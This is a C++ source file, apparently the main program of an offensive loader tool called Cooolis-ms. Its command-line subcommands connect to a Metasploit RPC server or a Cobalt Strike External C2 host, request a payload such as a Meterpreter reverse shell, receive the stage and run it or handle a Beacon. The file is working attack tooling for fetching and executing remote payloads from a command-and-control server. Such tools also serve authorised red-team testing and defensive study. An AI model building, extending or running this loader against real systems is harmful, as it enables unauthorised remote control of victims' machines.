/**************************
Code By Rvn0xsy
https://payloads.online
Email:rvn0xsy@gmail.com

SubCommand : Cobaltstrike External C2

e.g.  Cooolis-ms-x86.exe cobaltstrike -H 1.1.1.1 -P 2222

SubCommand : Metasploit RPC

e.g.  Cooolis-ms-x86.exe metasploit -H 1.1.1.1 -P 2222


***************************/



#include "Cooolis-msf.h"
#include "Cooolis-ExternalC2.h"
#include "rang.hpp"
#include "CLI11.hpp"


int main(int argc, char** argv)
{
	USHORT server_port = 8899;
	std::string msf_payload = "";
	std::string msf_options = "";
	std::string server_host = "";
	CLI::App app{ "Version v1.1.3" };

	app.require_subcommand(1);


	// [Metasploit]
	auto metasploit = app.add_subcommand("metasploit", "Metasploit RPC Loader");
	

	metasploit->add_option("-p,--payload", msf_payload, "Payload Name, e.g. windows/meterpreter/reverse_tcp");
	metasploit->add_option("-o,--options", msf_options, "Payload options, e.g. LHOST=1.1.1.1,LPORT=8866");
	

	metasploit->add_option("-P,--PORT", server_port, "RPC Server Port")->check(CLI::Range(1, 65535))->required();
	metasploit->add_option("-H,--HOST", server_host, "RPC Server Host")->check(CLI::ValidIPV4)->required();

	metasploit->callback([&]() {
		if (msf_options.length() > 200 || msf_payload.length() > 200) {
			std::cout << rang::bg::red << rang::style::bold << rang::fg::cyan << "PType And POptions Too long!" << std::endl;
		}
		else {
			CCooolisMetasploit* CooolisMSF = new CCooolisMetasploit;

			if (CooolisMSF->ConnectServer(server_host, server_port)) {
				CooolisMSF->SendPayload(msf_options, msf_payload);
				CooolisMSF->RecvStage();
				CooolisMSF->GoodCooolis();
			}

			delete CooolisMSF;
		}
	});

	// [Cobaltstrike]
	auto cobaltstrike = app.add_subcommand("cobaltstrike", "Cobaltstrike External C2 Loader");
	cobaltstrike->add_option("-P,--PORT", server_port, "External C2 Port")->check(CLI::Range(1, 65535))->required();
	cobaltstrike->add_option("-H,--HOST", server_host, "External C2 Host")->check(CLI::ValidIPV4)->required();

	cobaltstrike->callback([&]() {
		CCooolisExternalC2* CooolisCobaltstrike = new CCooolisExternalC2;
		if (CooolisCobaltstrike->ConnectServer(server_host, server_port) != FALSE) {
			CooolisCobaltstrike->SendOptions();
			CooolisCobaltstrike->RecvPayload();
			CooolisCobaltstrike->HandleBeacon();
		}
	});


	try {
		CLI11_PARSE(app, argc, argv);
	}
	catch (const CLI::ParseError& e) {
		std::cout << app.help() << std::endl;
		return app.exit(e);
	}

	return GetLastError();
}

